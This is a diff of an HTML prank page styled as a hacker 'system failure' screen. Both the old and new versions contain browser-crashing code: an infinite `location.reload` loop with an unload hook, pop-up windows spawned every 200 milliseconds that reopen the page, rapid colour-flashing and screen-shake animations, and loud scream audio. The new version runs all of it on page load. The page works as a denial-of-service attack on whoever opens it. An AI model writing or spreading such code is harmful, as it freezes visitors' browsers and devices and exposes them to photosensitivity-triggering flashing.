@@ -1,230 +1,195 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>You've Been Hacked 😈</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hacker Chaos</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-
-    /* Basic Reset */
-    * {
+    /* Matrix Effect */
+    body {
+      font-family: 'Courier New', Courier, monospace;
+      background-color: black;
+      color: #0f0;
+      overflow: hidden;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      background: black;
-      color: #00ff00;
-      font-family: 'Share Tech Mono', monospace;
-      overflow: hidden;
-      position: relative;
-    }
-
-    /* Matrix Background Canvas */
-    #matrixCanvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-    }
-
-    /* Main Content Container */
-    #content {
-      position: relative;
-      z-index: 1;
+      height: 100vh;
       text-align: center;
-      padding-top: 50px;
+      font-size: 16px;
     }
 
-    h1 {
-      font-size: 3rem;
-      text-shadow: 0 0 10px #00ff00;
-      margin-bottom: 20px;
+    /* Flickering Text */
+    @keyframes flicker {
+      0% { opacity: 1; }
+      20% { opacity: 0; }
+      40% { opacity: 1; }
+      60% { opacity: 0; }
+      80% { opacity: 1; }
+      100% { opacity: 0; }
     }
 
-    p {
-      font-size: 1.5rem;
-      text-shadow: 0 0 8px #00ff00;
-      margin-bottom: 20px;
+    h1, p {
+      animation: flicker 0.5s infinite;
     }
 
-    input,
-    button {
-      font-size: 1.2rem;
-      padding: 10px;
-      background: black;
-      border: 2px solid #00ff00;
-      color: #00ff00;
-      margin: 10px;
+    /* Glitch Effect */
+    @keyframes glitch {
+      0% { text-shadow: 1px 1px 5px rgba(255, 0, 0, 0.8), -1px -1px 5px rgba(0, 255, 0, 0.8); }
+      20% { text-shadow: -1px -1px 5px rgba(0, 0, 255, 0.8), 1px 1px 5px rgba(255, 255, 0, 0.8); }
+      40% { text-shadow: -2px 2px 5px rgba(0, 255, 255, 0.8), 2px -2px 5px rgba(255, 0, 255, 0.8); }
+      60% { text-shadow: 1px 1px 5px rgba(0, 255, 0, 0.8), -1px -1px 5px rgba(255, 0, 0, 0.8); }
+      80% { text-shadow: -1px -1px 5px rgba(255, 0, 255, 0.8), 1px 1px 5px rgba(0, 255, 255, 0.8); }
+      100% { text-shadow: 1px 1px 5px rgba(255, 0, 0, 0.8), -1px -1px 5px rgba(0, 255, 0, 0.8); }
     }
 
-    button:hover {
-      background: #00ff00;
-      color: black;
-      cursor: pointer;
-    }
-
-    /* Message and Hacker Image */
-    #message {
-      margin-top: 20px;
-      opacity: 0;
-      transition: opacity 1s;
-    }
-
-    #message.visible {
-      opacity: 1;
-    }
-
-    .hacker {
-      width: 300px;
-      display: block;
-      margin: 20px auto;
-    }
-
-    /* Chaos Overlay */
-    #chaosOverlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: black;
-      z-index: 10;
-      display: none;
-      text-align: center;
-      color: red;
-      font-size: 5rem;
-      padding-top: 40vh;
-    }
-
-    /* Flashing Background for Chaos */
-    .flashing {
-      animation: flash 0.1s infinite;
-    }
-
-    @keyframes flash {
-      0% { background-color: black; }
-      25% { background-color: red; }
-      50% { background-color: green; }
-      75% { background-color: blue; }
+    /* Flashing Background */
+    @keyframes chaosFlash {
+      0% { background-color: red; }
+      25% { background-color: yellow; }
+      50% { background-color: blue; }
+      75% { background-color: purple; }
       100% { background-color: black; }
     }
+
+    #chaosOverlay {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      animation: chaosFlash 0.5s infinite;
+    }
+
+    /* Moving Windows */
+    .window {
+      position: absolute;
+      width: 200px;
+      height: 200px;
+      background-color: #333;
+      color: white;
+      border: 2px solid #0f0;
+      padding: 10px;
+    }
+
   </style>
 </head>
 <body>
-  <!-- Matrix Background -->
-  <canvas id="matrixCanvas"></canvas>
 
-  <!-- Main Content -->
-  <div id="content">
-    <h1>Welcome to the System</h1>
-    <p>What is your name, good boy? 🟩</p>
-    <input type="text" id="nameInput" placeholder="Enter your name..." />
-    <button onclick="startCrash()">Submit</button>
+  <!-- Chaos Overlay -->
+  <div id="chaosOverlay"></div>
 
-    <div id="message">
-      <h1>Good boy, <span id="userName"></span> 😈</h1>
-      <p>Kiss your Chromebook goodbye... 💋</p>
-      <!-- Hacker Image -->
-      <img
-        src="https://lh4.googleusercontent.com/proxy/HQp3JQwu8uKU5seHJRUTG3u6_aNKTZcJV2cQhPXmHGB3gSRFXyiC8arcyjH-zAqmkPO896YkaNPEmpiLoG__EGmtbg4Vjqr1g8mDdweSgzHP5V_gpgqhHtRyCK6SGCq1uYF6Z0IxY8i2iaIm3yKVHWA"
-        alt="Hacker"
-        class="hacker"
-        id="hackerImg"
-      />
-      <!-- Evil Laughter Sound -->
-      <audio id="evilLaugh" src="https://dl.sndup.net/dmd67/remusic-scary-loud-screaming-279745.mp3" preload="auto"></audio>
-    </div>
-  </div>
+  <h1>Welcome to the System</h1>
+  <p>Initializing chaos... Please enjoy your time.</p>
 
-  <!-- Chaos Overlay (initially hidden) -->
-  <div id="chaosOverlay">SYSTEM FAILURE</div>
+  <!-- Add Matrix-style falling text -->
+  <div id="matrix"></div>
 
   <script>
-    // MATRIX EFFECT SETUP
-    const canvas = document.getElementById('matrixCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
-    const letters = "01XOX1XOX10XOX1XOX10XOX1XOX10XOX1XOX1";
-    const matrix = letters.split("");
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = [];
+    // Matrix Effect
+    let columns = Math.floor(window.innerWidth / 20);
+    let rows = Math.floor(window.innerHeight / 20);
+    let matrix = [];
     for (let i = 0; i < columns; i++) {
-      drops[i] = 1;
+      matrix[i] = [];
+      for (let j = 0; j < rows; j++) {
+        matrix[i][j] = String.fromCharCode(Math.random() * 256);
+      }
     }
 
-    function drawMatrix() {
-      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = "#0F0";
-      ctx.font = fontSize + "px monospace";
-      for (let i = 0; i < drops.length; i++) {
-        const text = matrix[Math.floor(Math.random() * matrix.length)];
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-          drops[i] = 0;
+    function matrixEffect() {
+      let output = '';
+      for (let i = 0; i < columns; i++) {
+        output += matrix[i][Math.floor(Math.random() * rows)] + ' ';
+      }
+      document.getElementById('matrix').innerHTML = output;
+      setTimeout(matrixEffect, 100);
+    }
+    matrixEffect();
+
+    // Screen Shake Effect
+    setInterval(() => {
+      const x = Math.random() * 20 - 10;
+      const y = Math.random() * 20 - 10;
+      document.body.style.transform = `translate(${x}px, ${y}px)`;
+    }, 20);
+
+    // Flickering Text
+    document.querySelectorAll('h1, p').forEach((element) => {
+      element.style.animation = 'flicker 0.5s infinite';
+    });
+
+    // Glitchy Text Effect
+    document.querySelectorAll('h1, p').forEach((element) => {
+      element.style.animation = 'glitch 0.5s infinite';
+    });
+
+    // Random Audio (MP3 sound)
+    const sounds = ['your-audio-file.mp3'];  // Replace with your mp3 file
+    setInterval(() => {
+      const randomSound = sounds[Math.floor(Math.random() * sounds.length)];
+      const audio = new Audio(randomSound);
+      audio.play();
+    }, Math.random() * 5000);
+
+    // Move Windows Code (Opening pop-up windows)
+    function moveWindows() {
+      let window1 = window.open(location.href, "_blank", "width=200,height=200");
+      let window2 = window.open(location.href, "_blank", "width=200,height=200");
+
+      if (!window1 || window1.closed || typeof window1.closed == "undefined") {
+        document.querySelector("h1").innerHTML =
+          "Error: Please enable popups and reload this page.";
+        clearInterval(interval);
+      }
+
+      let window1X = Math.random() * window.innerWidth - 200;
+      let window1Y = Math.random() * window.innerHeight - 200;
+      let window1VX = 3;
+      let window1VY = 3;
+
+      let window2X = Math.random() * window.innerWidth - 200;
+      let window2Y = Math.random() * window.innerHeight - 200;
+      let window2VX = 3;
+      let window2VY = 3;
+
+      const frame = function () {
+        window1X += window1VX;
+        window1Y += window1VY;
+        window1.moveTo(window1X, window1Y);
+
+        window2X += window2VX;
+        window2Y += window2VY;
+        window2.moveTo(window2X, window2Y);
+
+        if (window1X <= 0 || window1X >= window.innerWidth - 200) {
+          window1VX *= -1;
         }
-        drops[i]++;
-      }
+        if (window1Y <= 0 || window1Y >= window.innerHeight - 200) {
+          window1VY *= -1;
+        }
+
+        if (window2X <= 0 || window2X >= window.innerWidth - 200) {
+          window2VX *= -1;
+        }
+        if (window2Y <= 0 || window2Y >= window.innerHeight - 200) {
+          window2VY *= -1;
+        }
+
+        requestAnimationFrame(frame);
+      };
+      frame();
     }
-    setInterval(drawMatrix, 50);
 
-    // Start fullscreen automatically when the page loads
-    window.onload = function() {
-      if (document.documentElement.requestFullscreen) {
-        document.documentElement.requestFullscreen();
-      } else if (document.documentElement.mozRequestFullScreen) { // Firefox
-        document.documentElement.mozRequestFullScreen();
-      } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari and Opera
-        document.documentElement.webkitRequestFullscreen();
-      } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
-        document.documentElement.msRequestFullscreen();
-      }
-    };
+    let interval = setInterval(() => {
+      moveWindows();
+    }, 200);
 
-    // START CRASH FUNCTION
-    function startCrash() {
-      // Get the user's name
-      const name = document.getElementById('nameInput').value.trim() || 'User';
-      document.getElementById('userName').textContent = name;
-
-      // Reveal the message div
-      document.getElementById('message').classList.add('visible');
-
-      // Hide the input and button
-      document.getElementById('nameInput').style.display = 'none';
-      document.querySelector('button').style.display = 'none';
-
-      // Play the evil laugh sound
-      document.getElementById('evilLaugh').play();
-
-      // After 3 seconds, show the chaos overlay and begin chaos mode
-      setTimeout(() => {
-        const chaos = document.getElementById('chaosOverlay');
-        chaos.style.display = 'block';
-        chaos.classList.add('flashing');
-
-        // Begin screen shaking
-        setInterval(() => {
-          const x = Math.random() * 10 - 5;
-          const y = Math.random() * 10 - 5;
-          document.body.style.transform = `translate(${x}px, ${y}px)`;
-        }, 50);
-
-        // ORIGINAL CRASH CODE:
-        onbeforeunload = function(){ localStorage.x = 1; };
-        setTimeout(function(){
-          while(1) location.reload(1);
-        }, 1000);
-      }, 3000);
-    }
+    // Crash Code
+    onbeforeunload = function () { localStorage.x = 1; };
+    setTimeout(function () {
+      while (1) location.reload(1);
+    }, 1000);
   </script>
+
 </body>
 </html>
